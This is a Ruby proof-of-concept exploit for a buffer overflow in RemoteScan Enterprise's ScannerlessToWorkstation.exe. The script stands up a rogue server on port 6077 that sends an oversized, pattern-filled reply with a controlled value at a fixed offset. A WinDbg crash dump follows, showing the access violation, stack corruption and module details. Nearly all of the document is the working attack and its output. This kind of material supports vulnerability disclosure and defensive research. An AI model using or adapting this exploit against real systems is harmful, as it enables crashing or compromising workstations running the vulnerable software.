#!/usr/bin/env ruby
# RemoteScan Enterprise (ScannerlessToWorkstation.exe) Buffer Overflow
require 'socket'
require 'rex'

data = Rex::Text.pattern_create(945)
data[120,4] = [0x41414141].pack('V')
buff =  "200 #{data}.localdomain|"
buff << "6077^TWAIN2 FreeImage Software Scanner|"
buff << "0|"
buff << "8.500000,14.000000,0.000000,0.000000,8.500000,14.000000|"
buff << "1|"
buff << "0|"
buff << "0|"
buff << "0|"
buff << "0.0.0.0|"
buff << "0,1,2|"
buff << "0|"
buff << "0\r\n"

server = TCPServer.new(6077)
client = server.accept
client.puts "220 Connect(active 1, max active 1) session 1 to RemoteScan Server 10.659 on Tue Sep 19 10:05:24 2017\r\n"
while line = client.gets
  puts line
  client.puts buff
end
__END__
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
0012d768 41346541 65413565 37654136 41386541 image00400000+0x1dae
0012d76c 65413565 37654136 41386541 66413965 0x41346541
0012d770 37654136 41386541 66413965 31664130 0x65413565
0012d774 41386541 66413965 31664130 41326641 0x37654136
0012d778 66413965 31664130 41326641 66413366 0x41386541
0012d77c 31664130 41326641 66413366 35664134 0x66413965
0012d780 41326641 66413366 35664134 41366641 0x31664130
0012d784 66413366 35664134 41366641 66413766 0x41326641
0012d788 35664134 41366641 66413766 39664138 0x66413366
0012d78c 41366641 66413766 39664138 41306741 0x35664134
0012d790 66413766 39664138 41306741 67413167 0x41366641
0012d794 39664138 41306741 67413167 33674132 0x66413766
0012d798 41306741 67413167 33674132 41346741 0x39664138
0012d79c 67413167 33674132 41346741 67413567 0x41306741
0012d7a0 33674132 41346741 67413567 37674136 0x67413167
0012d7a4 41346741 67413567 37674136 41386741 0x33674132
0012d7a8 67413567 37674136 41386741 68413967 0x41346741
0012d7ac 37674136 41386741 68413967 31684130 0x67413567
0012d7b0 41386741 68413967 31684130 41326841 0x37674136
0012d7b4 68413967 31684130 41326841 68413368 0x41386741
0:000> !analyze -v
FAULTING_IP: 
image00400000+1dae
00401dae 803b00          cmp     byte ptr [ebx],0

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00401dae (image00400000+0x00001dae)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 41414141
Attempt to read from address 41414141

FAULTING_THREAD:  000004b0

DEFAULT_BUCKET_ID:  STRING_DEREFERENCE

PROCESS_NAME:  image00400000

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

READ_ADDRESS:  41414141 

NTGLOBALFLAG:  70

APPLICATION_VERIFIER_FLAGS:  0

ADDITIONAL_DEBUG_TEXT:  Followup set via attribute from Frame 0 on thread ffffffff

LAST_CONTROL_TRANSFER:  from 41346541 to 00401dae

PRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE

BUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_STACK_CORRUPTION

IP_ON_HEAP:  41346541
The fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.

IP_IN_FREE_BLOCK: 41346541

FRAME_ONE_INVALID: 1

STACK_TEXT:  
76fd896e GDI32!bBatchTextOut
76fd8104 GDI32!ExtTextOutW
77789409 USP10!GDITextOut
77771680 USP10!ScriptCPtoCluster
77767203 USP10!ScriptCPtoX
77767305 USP10!ScriptCPtoX
77768633 USP10!ScriptStringCPtoX
76fdca70 GDI32!NtGdiLineTo
76fdca58 GDI32!LineTo
77775fb8 USP10!MultiPartStringOut
77775fff USP10!MultiPartStringOut
77766883 USP10!ScriptTextOut
76fdc0dd GDI32!GetTextExtentExPointWPri
77789327 USP10!GDIPlace
77776110 USP10!InternalStringOut
777771d8 USP10!UspFreeMem
777693fb USP10!CTempMemory::~CTempMemory
77768be9 USP10!ScriptStringOut
77773296 USP10!RenderItemWithFallback
7777732d USP10!UspAcquireTempAlloc
77767c46 USP10!ScriptCacheGetHeight
77774a38 USP10!ScriptStringAnalyzeGlyphs
77768253 USP10!ScriptStringAnalyse
75fa1736 LPK!LpkStringAnalyse
7458d862 uxtheme!CRenderObj::GetIntList
7458111c uxtheme!CRenderObj::GetTransitionDuration
75fa17b4 LPK!LpkDrawTextEx
75ee7ca3 USER32!DT_DrawStr
75ee7c35 USER32!DT_DrawJustifiedLine
75ee4d7b USER32!AddEllipsisAndDrawLine
75ee4d97 USER32!AddEllipsisAndDrawLine
77019140 GDI32!semLocal
76fd7978 GDI32!bGetTextMetricsWInternal
74573f54 uxtheme!IsMirrored
74573efa uxtheme!CImageFile::DrawBackgroundDS
74573f3a uxtheme!CImageFile::DrawBackgroundDS
76fd7a14 GDI32!GetTextMetricsW
76fdc0a8 GDI32!NtGdiGetTextCharsetInfo
75ee7f17 USER32!DT_InitDrawTextInfo
75ee7bfb USER32!DrawTextExW
74574e98 uxtheme!CTextDraw::DrawTextW
776bd56c ntdll!CheckHeapFillPattern
776d4916 ntdll!RtlpValidateHeap
7769801a ntdll!RtlpAllocateHeap
7763c7bd ntdll!RtlpAllocateHeap
7766349f ntdll!RtlpAllocateHeap
776d58c0 ntdll!RtlDebugFreeHeap
776d58a4 ntdll!RtlDebugFreeHeap
7762d74d ntdll!_except_handler4
776634ca ntdll!RtlAllocateHeap
75ee888d USER32!UserCallWinProcCheckWow
76fd7209 GDI32!NtGdiBitBlt
76fd71f1 GDI32!BitBlt
7458e30d uxtheme!SHAlphaBlend
7766801b ntdll!RtlpReAllocateHeap
7458e032 uxtheme!CFadeAnimation::Paint
76fd6966 GDI32!DeleteObject
76fd68b4 GDI32!DeleteObject
74575afc uxtheme!CSetClipRect::~CSetClipRect
7458e212 uxtheme!CPaintBuffer::_PaintAnimated
7458e16e uxtheme!CPaintBuffer::PaintNextFrame
7458e124 uxtheme!CPaintBufferPool::Impl::BufferedPaintRenderAnimation
77667ed2 ntdll!RtlReAllocateHeap
7765f938 ntdll! ?? ::FNODOBFM::`string'
776bd502 ntdll!RtlpCheckBusyBlockTail
776d563f ntdll!RtlDebugReAllocateHeap
776d5623 ntdll!RtlDebugReAllocateHeap
75ee7234 USER32!RealDefWindowProcWorker
7769ba29 ntdll!RtlpReAllocateHeap
7765f98e ntdll! ?? ::FNODOBFM::`string'
75ee7308 USER32!RealDefWindowProcW
75ee8e72 USER32!_EndUserApiHook
75f398d8 USER32!gcCallUserApiHook
75ee731c USER32!DefWindowProcW
75ee72b6 USER32!DefWindowProcW
75f362e3 USER32!_except_handler4
747078a3 comctl32!CStatic::WndProc
747078b6 comctl32!CStatic::WndProc
74571722 uxtheme!CGlobalBufferPool::NeedsPruning
75ee83d4 USER32!GetWindowLongW
75ee83e0 USER32!GetWindowLongW
77697865 ntdll!RtlpCreateSplitBlock
77663426 ntdll!RtlpAllocateHeap
75ee881f USER32!UserCallWinProcCheckWow
75ee88c9 USER32!UserCallWinProcCheckWow
7763ac7b ntdll!LdrUnlockLoaderLock
7766b037 ntdll!LdrUnlockLoaderLock
751a9125 mswsock!WSPStartup
77697b89 ntdll!RtlpFreeHeap
7766316f ntdll!RtlpFreeHeap
77697aca ntdll!RtlpFreeHeap
757ebd93 KERNELBASE!CreateRemoteThreadEx
751d6050 mswsock!SockAsyncThreadReferenceCount
751a4359 mswsock!SockPostProcessConnect
77662d68 ntdll!RtlFreeHeap
757e69a0 KERNELBASE!InterlockedDecrement
751a7178 mswsock!SockAsyncConnectCompletion
751a717f mswsock!SockAsyncConnectCompletion
77656b7e ntdll!RtlEnterCriticalSection
751add03 mswsock!SockIsSocketConnected
751add06 mswsock!SockIsSocketConnected
751abf3e mswsock!WSPGetSockOpt
751abf56 mswsock!WSPGetSockOpt
7780302d WS2_32!WahReferenceContextByHandle
751c2bdf mswsock!_except_handler4
7780e7d6 WS2_32!getsockopt
7780305c WS2_32!DSOCKET::DropDSocketReference
7780c6a7 WS2_32!_SEH_epilog4_GS
7780e7fe WS2_32!getsockopt
75a7f708 msvcrt!time
751a301b mswsock!SockSetHandleContext
77654cac ntdll!NtDeviceIoControlFile
751a64b4 mswsock!WSPSelect
751a73b9 mswsock!WSPSelect
751a16af mswsock!_SEH_epilog4_GS
751a6531 mswsock!WSPSelect
751a4798 mswsock!WSPSend
751a4821 mswsock!WSPSend
7780c540 WS2_32!send
7780c549 WS2_32!send
75a7f745 msvcrt!_time32
004030ba image00400000
75ee603f USER32!wsprintfA
77804a20 WS2_32!select
751a1a26 mswsock!WSPIoctl
77803113 WS2_32!WSAIoctl
7780311c WS2_32!WSAIoctl
77803153 WS2_32!ioctlsocket
75ee5e2f USER32!wvsprintfA
00407adb image00400000
00412dc8 image00400000
75ee5df1 USER32!wvsprintfA
00407af3 image00400000
00403146 image00400000
0040702c image00400000
751a66ea mswsock!WSPSelect
77803004 WS2_32!WahReferenceContextByHandle
77803308 WS2_32!PROTO_CATALOG_ITEM::Dereference
77823562 WS2_32!_except_handler4
77803de1 WS2_32!WSASocketW
75ee5fda USER32!SP_PutNumber
75b10330 msvcrt!_CrtLock_Time
77655ebc ntdll!NtWriteFile
75a7dbeb msvcrt!strchr
00401dfb image00400000
7457c868 uxtheme!_GetWindowBorders
77663404 ntdll!RtlpAllocateHeap
7769746d ntdll!RtlpCoalesceFreeBlocks
776d5851 ntdll!RtlDebugFreeHeap
7457c6a1 uxtheme!NcGetFrameMetrics
7457c7c3 uxtheme!NcGetFrameMetrics
7769bba7 ntdll!RtlpReAllocateHeap
75ee6335 USER32!GetWindowBordersInternal
75ee6bad USER32!GetWindowBorders
76fdc0f2 GDI32!NtGdiGetTextExtentExW
75fa18c1 LPK!LpkCharsetDraw
777772d0 USP10!UspFreeAnalysisMem
777bb01c USP10!fStaticAnalysisBufferIsFree
777682ef USP10!ScriptStringFree
77767200 USP10!ScriptCPtoX
76fd7265 GDI32!NtGdiDrawStream
76fd724f GDI32!GdiDrawStream
75edc3b7 USER32!RealDefWindowProcWorker
00403b6e image00400000
75ee86ef USER32!InternalCallWinProc
74573ab2 uxtheme!StreamInit
75fa239a LPK!EditStringAnalyse
74571701 uxtheme!CGlobalBufferPool::Prune
74572f10 uxtheme!ThemeHeapReAlloc
745744fe uxtheme!CThemeMap<void *,CPaintBuffer *,CThemeMapEqualHelper<void *,CPaintBuffer *> >::RemoveAt
74574562 uxtheme!CPaintBuffer::SetFree
745aa0b8 uxtheme!CGlobalBufferPool::s_lFreeBuffers
75edbaf1 USER32!UserCallDlgProcCheckWow
00403b61 image00400000
75edbaa7 USER32!UserCallDlgProcCheckWow
7471f85f comctl32!Button_WndProc
75edb98b USER32!DefDlgProcWorker
75ef90f9 USER32!DefDlgProcA
75ee8876 USER32!UserCallWinProcCheckWow
75ef90d7 USER32!DefDlgProcA
7471f82b comctl32!Button_WndProc
75ee7631 USER32!SendMessageWorker
75ee764c USER32!SendMessageW
75ee7695 USER32!SendMessageW
74794e95 comctl32!Button_NotifyParent
74794ef7 comctl32!Button_ReleaseCapture
74794d89 comctl32!Button_WndProc
76e6319b MSCTF!_except_handler4
76e039f5 MSCTF!FindSYSTHREAD
75ee89b5 USER32!DispatchMessageWorker
75ee9180 USER32!_PeekMessage
75ee8e9c USER32!DispatchMessageW
75ee7033 USER32!IsDialogMessageW
75f052ed USER32!DialogBox2
75f05511 USER32!InternalDialogBox
00415018 image00400000
00400000 image00400000
75f05553 USER32!DialogBoxIndirectParamAorW
75f1cfb6 USER32!DialogBoxParamA
00404613 image00400000
77010d10 GDI32!MRXD::bCheckRecord
00404c0b image00400000
75fa18e4 LPK!LpkCharsetDraw
75fa1900 LPK!LpkCharsetDraw
00404cae image00400000
76fd6390 GDI32!hGetPEBHandle
76fd7c8b GDI32!NtGdiExtSelectClipRgn
77697746 ntdll!RtlpCoalesceFreeBlocks
7457fc13 uxtheme!CRenderObj::FixupPartObjectCache<CTextDraw>
76fd829d GDI32!NtGdiAlphaBlend
76fd8281 GDI32!GdiAlphaBlend
7458e08d uxtheme!SHAlphaBlend
74580956 uxtheme!CPaintBufferPool::BufferedPaintRenderAnimation
74580919 uxtheme!BufferedPaintRenderAnimation
74580923 uxtheme!BufferedPaintRenderAnimation
7471768a comctl32!Button_PaintDirectly
00404c2b image00400000
76e03b5a MSCTF!EnsurePrivateMessages
75ee31fd USER32!CallHookWithSEH
75ee286f USER32!GetMessageA
00413080 image00400000
75ee28be USER32!GetMessageA
75ee3578 USER32!DispatchMessageA
00403353 image00400000
746f6d65 comctl32!CLVItemStore::ResetCachedPositions
776d519a ntdll!RtlDebugAllocateHeap
776d517e ntdll!RtlDebugAllocateHeap
77697d96 ntdll!RtlpAllocateHeap
75fb0000 kernel32!_imp__DebugBreak <PERF> (kernel32+0x0)
00405363 image00400000
004053b0 image00400000
00406240 image00400000
76001174 kernel32!BaseThreadInitThunk
7766b3f5 ntdll!__RtlUserThreadStart
7766b3c8 ntdll!_RtlUserThreadStart
0040522f image00400000


STACK_COMMAND:  dds 12be68 ; kb

FOLLOWUP_IP: 
image00400000+30ba
004030ba 59              pop     ecx

SYMBOL_STACK_INDEX:  79

SYMBOL_NAME:  image00400000+30ba

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: image00400000

DEBUG_FLR_IMAGE_TIMESTAMP:  58a21c7f

BUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_STACK_CORRUPTION_image00400000+30ba

IMAGE_NAME:  C:\Program Files\RemoteScan Server\ScannerlessToWorkstation.exe

FAILURE_BUCKET_ID:  STRING_DEREFERENCE_c0000005_C:\Program Files\RemoteScan Server\ScannerlessToWorkstation.exe!Unknown

Followup: MachineOwner
---------

0:000> lmvm image00400000
start    end        module name
00400000 0041a000   image00400000 C (no symbols)           
    Loaded symbol image file: C:\Program Files\RemoteScan Server\ScannerlessToWorkstation.exe
    Image path: image00400000
    Image name: image00400000
    Timestamp:        Mon Feb 13 13:52:15 2017 (58A21C7F)
    CheckSum:         00000000
    ImageSize:        0001A000
    File version:     8.3.0.0
    Product version:  8.3.0.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Quest Software Inc
    ProductName:      Link Workstation
    InternalName:     RemoteScan Workstation Link
    OriginalFilename: LinkWorkstation.exe
    ProductVersion:   8, 3, 0, 0
    FileVersion:      8, 3, 0, 0
    PrivateBuild:     8, 3, 0, 0
    SpecialBuild:     8, 3, 0, 0
    FileDescription:  RemoteScan Utility For Linking Workstation
    LegalCopyright:   Copyright © 2017
    LegalTrademarks:  RemoteScan
    Comments:         RemoteScan Workstation Link Utility
